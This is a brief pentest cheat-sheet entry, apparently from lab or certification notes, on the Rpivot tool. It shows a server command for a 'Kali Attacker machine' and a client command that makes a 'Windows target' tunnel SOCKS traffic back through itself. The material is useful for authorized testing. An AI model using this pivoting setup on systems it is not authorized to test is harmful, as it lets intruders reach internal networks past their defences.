## Rpivot 

Allows you to set up a SOCKS4 proxy on your local Kali machine that redirects through a Windows target machine.  

Found at:  https://github.com/klsecservices/rpivot

On the Kali Attacker machine:

```bash
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
```

On the Windows target:

```powershell
rpivot-client --server-ip 192.168.119.216 --server-port 9999
```

